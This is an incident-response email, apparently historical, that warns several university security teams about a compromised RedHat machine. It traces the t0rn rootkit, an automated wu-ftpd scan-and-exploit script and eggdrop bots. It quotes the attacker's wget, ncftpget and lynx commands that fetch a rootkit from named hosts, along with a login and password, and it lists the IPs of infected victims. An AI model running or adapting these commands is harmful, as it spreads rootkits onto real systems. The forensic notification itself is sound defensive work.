@@ -1,0 +1,78 @@
+To: security@uiuc.edu,
+    security@rice.edu,
+    security@gatech.edu,
+    ?security@odu.edu,
+    +security@utexas.edu,
+    security@purdue.edu,
+    +security@bradley.edu,
+    webmaster@www.dfis.ull.es,
+    +cdick@mail.ocis.net,
+    csr@coptechinc.com, techsupport@coptechinc.com
+Cc: jen@math.uiuc.edu
+Re: SECURITY: hacked machines
+
+The following is a forensic analysis of macaulay.math.uiuc.edu, a RedHat
+6.1 machine that was recently hacked.  You are receiving this message
+because I believe a machine under your control was also hacked.
+
+Initial scan of macaulay:
+Port       State       Service
+22/tcp     open        ssh
+23/tcp     open        telnet
+25/tcp     open        smtp
+79/tcp     open        finger
+113/tcp    open        auth
+513/tcp    open        login
+514/tcp    open        shell
+It had previously also been running wu-ftpd:
+220 macaulay.math.uiuc.edu FTP server (Version wu-2.6.0(1) Thu Oct 21 12:27:00 EDT 1999) ready.
+
+Preliminary work shows that macaulay was compromised around 09:03 Feb 4.
+Lots of files were trojaned (including ps and ls); many left with uid/gid
+1042/1037.  The hacker returned at about 17:30 Feb 4 and initiated a
+scanning program in /.../awu/.
+
+awu (auto-wu) was made in 2002 by riksta of [OPTIC]
+Compiled on this machine on Feb 4 17:45, so most likely required human
+interaction.  (The t0rn rootkit was installed automatically at 9:04.)
+
+There the file 128 shows that all of 128.11-128.254 was to be scanned,
+basically by calling awu repeatedly.
+The file awu is a shell script that does the following:
+ - runs pscan2 on a class B network looking for answers on port 21
+ - runs ssvuln on machines that answered to get the ftp banner message
+ - runs oops on the outfile (exploits each machine in turn)
+
+It found a list of 1313 potentially-vulnerable machines.  Of those,
+it appears to have successfully infected the following machines:
+  128.42.57.153 paprika.mems.rice.edu
+  128.61.36.113 r36h113.res.gatech.edu
+  128.82.226.65 modestus.cee.odu.edu
+  128.83.143.50 boniperti.csres.utexas.edu
+  128.83.143.78 nlp01.csres.utexas.edu
+The owners can verify that their machines were compromised by checking
+for a backdoor listening on port 12321.
+
+Attacked machines are automatically rooted by downloading the rootkit
+by one of the following means:
+  /usr/bin/wget http://136.176.52.62/rk.tgz
+  /usr/bin/ncftpget ftp://maaiman:gokvcvz3@128.210.138.107/rk.tgz
+  /usr/bin/lynx -dump http://136.176.52.62/rk.tgz >> rk.tgz
+Since these machines are distributing a rootkit for automated
+installation, it is critical that they be shut down quickly.
+
+~spiroff/.cl/ had eggdrop in it, and a crontab to keep it running.
+Running eggdrop (and sniffing the traffic) we see that it tries to
+connect to the following four IP.port combinations:
+  128.210.078.012.24120		capital.polsci.purdue.edu
+  193.145.098.212.24121		molec2.dfis.ull.es
+  209.052.174.131.24122		secure.ocis.net
+  209.113.133.180.24123		chef.coptechinc.com
+Ordinarily one would expect an eggdrop to connect to port 6667(irc),
+so the fact that these are connecting to other high-numbered ports
+(that are consecutive!) indicates these machines are also hacked.
+Indeed, each is running a vulnerable FTP.
+
+I strongly suggest a complete reinstall of any affected machines.  If
+you have any questions about this incident, or need help in cleaning
+up your systems, please feel free to contact me.
